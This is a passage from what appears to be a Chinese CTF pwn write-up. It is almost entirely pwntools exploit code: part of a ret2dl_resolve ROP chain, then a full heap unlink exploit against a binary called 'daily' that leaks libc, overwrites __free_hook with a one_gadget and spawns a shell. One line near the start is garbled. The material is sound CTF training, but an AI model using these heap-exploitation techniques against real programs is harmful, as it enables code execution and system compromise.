    payload+= p32(bss) 
    payload+= p32(0x400)
    payload+= p32(pop_ebp)
    payload+= p32(bss)
    payload+= p32(lr)
    p.send(payload)
    sleep(1)
    plt_0 = 0x08048380
    r_info = 0x107
    rel_plt = 0x0804833c  
    dynsym =  0x080481dc
    dynstr = 0x0804827c
    fake_sys_addr = bss + 36
    align = 0x10 - ((fake_sys_addr-dynsym)&0xf)
    fake_sys_addr = fake_sys_addr + align
    index = (fake_sys_addr - dynsym)/0x10
    r_info = (index __<……….**
double_free思路我就不说了，自己看exp吧，类似的。。。比unlink要简单一点。。。。
**0x33 unlink思路_exp如下：**
    #coding:utf-8
    from pwn import *
    #from LibcSearcher import *
    context(os='linux',arch='amd64')
    #context.log_level = 'debug'
    p = process('./daily')
    def add(size,payload):
        p.recvuntil('choice:')
        p.sendline('2')
        p.recvuntil('daily:')
        p.sendline(str(size))
        p.recvuntil('dailyn')
        p.send(payload)
    def view():
        p.recvuntil('choice:')
        p.sendline('1')
    def delete(index):
        p.recvuntil('choice:')
        p.sendline('4')
        p.recvuntil('daily:')
        p.sendline(str(index))
    def upgrade(index,payload):
        p.recvuntil('choice:')
        p.sendline('3')
        p.recvuntil('daily:')
        p.sendline(str(index))
        p.recvuntil('dailyn')
        p.send(payload)
    payload = 'x66'*0x200
    add(len(payload),payload)     #index 0
    add(len(payload),payload)     #index 1
    add(len(payload),payload)     #index 2
    add(len(payload),payload)     #index 3
    delete(1)                     #delete 1
    delete(2)                     #delete 2
    payload = 'x12'*8
    add(0x1a0,payload)            #index 1      size无所谓，看心情。。。
    #-------------------------------------------利用large chunkl来leak libcbase和heapbase---------    view()
    p.recvuntil('x12x12x12x12x12x12x12x12')
    main_arena_addr = u64(p.recv(6).ljust(8,'x00')) - (0xf68-0xb20)
    log.success('main_arena_addr = '+hex(main_arena_addr))
    libcbase = main_arena_addr - (0x4be5b20-0x4821000)
    log.success('libcbase = '+hex(libcbase))
    payload = 'x12'*12+'x21'*4
    upgrade(1,payload)
    view()
    p.recvuntil('x21x21x21x21')
    heap_addr = u64(p.recv(4).ljust(8,'x00')) - 0x210
    log.success('heap_addr = '+hex(heap_addr))
    #gdb.attach(p)
    #-----------------------------------------------leak success--------------------------------------    payload = 'a'*8
    add(0x260,payload)            #index 2  这里清空unsortedbin为了使之后的思路更清晰。
    #gdb.attach(p)
    #-----------------------------------------------prepare unlink------------------------------------    payload = p64(0)
    payload+= p64(0xa1)
    payload+= p64(0)*2
    payload+= p64(0xa0)
    payload+= p64(heap_addr+0x20)
    payload = payload.ljust(0xa0,'x00')
    payload+= p64(0x0)
    payload+= p64(0x91)
    payload+= p64(0)*2
    payload+= p64(0x80)
    payload+= p64(heap_addr+0xc0)
    payload = payload.ljust(0x130,'x00')
    payload+= p64(0)
    payload+= p64(0x21)
    payload+= p64(0)*2
    payload+= p64(0)
    payload+= p64(0x21)
    upgrade(0,payload)
    #gdb.attach(p)
    index = (heap_addr + 0x30 - 0x602060)/0x10
    delete(index)               
    #gdb.attach(p)
    payload = p64(0)
    add(0x90,payload)             #index 4
    payload = p64(0)*2
    payload+= p64(0)
    payload+= p64(0x91)
    payload+= p64(0x6020a8-0x18)
    payload+= p64(0x6020a8-0x10)
    payload+= p64(0)*14
    payload+= p64(0x90)
    payload+= p64(0x90)
    payload+= p64(0)*2
    payload+= p64(0x80)
    payload+= p64(heap_addr+0xc0)
    payload+= p64(0)*12
    payload+= p64(0)
    payload+= p64(0x21)
    payload+= p64(0)*2
    payload+= p64(0)
    payload+= p64(0x21)
    upgrade(0,payload)
    #gdb.attach(p)
    index = (heap_addr + 0xd0 - 0x602060)/0x10
    delete(index)
    #gdb.attach(p)
    #-------------------------------unlink success---------------------------------------------    
    free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)
    log.success('free_hook = ' + hex(free_hook))
    payload = p64(0)*2
    payload+= p64(0x80)
    payload+= p64(free_hook)
    upgrade(4,payload)
    #gdb.attach(p)
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    upgrade(4,p64(one_gadget[1]+libcbase))
    #gdb.attach(p)
    delete(0)
    p.interactive()
**0x35 double_free思路_exp如下：**